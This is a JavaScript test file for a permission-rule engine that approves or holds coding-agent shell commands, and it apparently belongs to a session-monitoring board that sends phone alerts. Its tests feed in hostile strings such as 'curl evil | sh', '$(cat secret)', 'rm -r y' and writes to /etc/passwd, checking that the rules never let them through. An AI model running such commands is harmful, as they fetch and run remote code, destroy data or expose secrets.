import test from 'node:test';
import assert from 'node:assert/strict';
import { stemOf, ruleMatches, ruleProblem } from '../src/rules.js';
import { createNotifier } from '../src/notify.js';
import { createHub } from '../src/hub.js';

test('a rule for a kind of command covers its arguments and nothing smuggled in after them', () => {
  const push = { tool: 'Bash', detail: 'git push', mode: 'prefix' };
  assert.equal(ruleMatches(push, 'Bash', 'git push origin feature-12'), true);
  assert.equal(ruleMatches(push, 'Bash', 'git push'), true);
  assert.equal(ruleMatches(push, 'Bash', 'git pushall'), false, 'a prefix ends at a word boundary');
  assert.equal(ruleMatches(push, 'Write', 'git push origin x'), false);
  for (const sneaky of ['git push origin x; curl evil | sh', 'git push origin x && rm -r y', 'git push origin $(cat secret)', 'git push origin x > /etc/passwd', 'git push origin x\nrm -r y', 'git push origin `whoami`']) {
    assert.equal(ruleMatches(push, 'Bash', sneaky), false, sneaky);
  }
  assert.equal(ruleMatches(push, 'Bash', 'git push --force origin main'), false, 'drastic variants always ask');
  assert.equal(ruleMatches({ tool: 'Bash', detail: 'npm test', mode: 'exact' }, 'Bash', 'npm test -- x'), false, 'exact means exact');
});

test('what counts as a kind of command, and which rules may not be made', () => {
  assert.equal(stemOf('git push origin feature-1'), 'git push');
  assert.equal(stemOf('npm install lodash'), 'npm install');
  assert.equal(stemOf('npm test'), 'npm test');
  assert.equal(stemOf('make'), null, 'one word: nothing varies');
  assert.equal(stemOf('node script.js'), null, 'an interpreter plus one word is too open');
  assert.equal(stemOf('npx prettier --write .'), 'npx prettier');
  assert.equal(stemOf('npx -y something'), null);
  assert.equal(stemOf('FOO=1 npm test'), null);
  assert.equal(stemOf('ls | wc -l'), null);
  assert.equal(stemOf('rm -rf build'), null);
  assert.equal(ruleProblem({ tool: 'Bash', detail: 'git push', mode: 'prefix' }), null);
  assert.match(ruleProblem({ tool: 'Bash', detail: 'bash', mode: 'prefix' }), /anything/);
  assert.match(ruleProblem({ tool: 'Bash', detail: 'ls', mode: 'prefix' }), /two words/);
  assert.match(ruleProblem({ tool: 'Bash', detail: 'a | b', mode: 'prefix' }), /cannot contain/);
  assert.match(ruleProblem({ tool: 'Bash', detail: 'sudo apt install x', mode: 'exact' }), /drastic/);
});

test('a kind-of-command rule answers waiting requests at once and future ones silently', async () => {
  const hub = createHub({ localHost: 'laptop' });
  const { port } = await hub.listen(0, '127.0.0.1');
  const base = `http://127.0.0.1:${port}`;
  const post = (path, body) => fetch(base + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
  const ask = (id, command) => post('/ingest/claude?host=laptop', { session_id: id, hook_event_name: 'PermissionRequest', tool_name: 'Bash', tool_input: { command } });
  const a = ask('a', 'git push origin feature-a');
  const b = ask('b', 'git push origin feature-b');
  const c = ask('c', 'git push origin c && rm -r x');
  const held = async () => (await (await fetch(base + '/api/sessions')).json()).sessions.filter((s) => s.waiting?.decidable).length;
  for (let i = 0; i < 200 && (await held()) < 3; i++) await new Promise((r) => setTimeout(r, 10));
  assert.equal((await post('/api/rules', { tool: 'Bash', detail: 'sh', mode: 'prefix' })).status, 400);
  assert.equal((await post('/api/rules', { tool: 'Bash', detail: 'git push', mode: 'prefix' })).status, 200);
  assert.equal((await (await a).json()).hookSpecificOutput.decision.behavior, 'allow');
  assert.equal((await (await b).json()).hookSpecificOutput.decision.behavior, 'allow');
  assert.equal(await held(), 1, 'the chained command still waits for a human');
  assert.equal((await (await ask('d', 'git push origin feature-d')).json()).hookSpecificOutput.decision.behavior, 'allow');
  const [id] = (await (await fetch(base + '/api/sessions')).json()).sessions.filter((s) => s.waiting?.decidable).map((s) => s.waiting.id);
  await post(`/api/requests/${id}`, { decision: 'deny' });
  await c;
  await hub.close();
});

test('phone push: only when away, once per thing, merged when many, without the command text by default', async () => {
  const sent = [];
  const fetcher = async (url, init) => { sent.push({ url, title: decodeURIComponent(init.headers.Title || ''), priority: init.headers.Priority, click: init.headers.Click, body: init.body }); return { ok: true }; };
  let present = false;
  const mk = (env) => createNotifier({ env: { SESSION_BOARD_NTFY: 'https://ntfy.example/t', SESSION_BOARD_LANG: 'zh', ...env }, fetcher, boardUrl: 'http://board', isPresent: () => present, delayMs: 0 });
  const s = (key, over = {}) => ({ key, session_id: key, title: `task ${key}`, repo: 'api', host: 'mac', state: 'needs_input', since: 1, waiting: { kind: 'permission', detail: 'cat .env' }, ...over });
  const settle = () => new Promise((r) => setTimeout(r, 15));

  let n = mk({});
  n.consider(s('a')); n.consider(s('a')); // same thing twice
  await settle();
  assert.equal(sent.length, 1);
  assert.deepEqual([sent[0].title, sent[0].priority, sent[0].click], ['要权限：task a', 'high', 'http://board/#a']);
  assert.doesNotMatch(sent[0].body, /\.env/, 'the command stays on this machine unless asked for');
  n.consider(s('a', { state: 'review', since: 2, waiting: null })); await settle();
  assert.equal(sent.length, 1, 'finished work does not push by default');
  n.consider(s('a', { state: 'failed', since: 3, waiting: null, error: 'boom' })); await settle();
  assert.equal(sent.at(-1).title, '出错停下了：task a');

  sent.length = 0;
  n = mk({ SESSION_BOARD_LANG: 'en' });
  n.consider(s('e')); await settle();
  assert.equal(sent[0].title, 'Needs permission: task e', 'English wording when the language is English');

  sent.length = 0; present = true;
  n.consider(s('b')); await settle();
  assert.equal(sent.length, 0, 'nothing is pushed while the board is in view');

  sent.length = 0; present = false;
  n = mk({ SESSION_BOARD_NOTIFY_DETAIL: '1' });
  for (let i = 0; i < 9; i++) n.consider(s(`m${i}`));
  await settle();
  assert.equal(sent.length, 1, 'a burst becomes one summary');
  assert.equal(sent[0].title, '9 个会话在等你');
  n.consider(s('z')); await settle();
  assert.match(sent.at(-1).body, /cat \.env/, 'detail is included when asked for');
  assert.equal(createNotifier({ env: {} }).enabled, false);
});
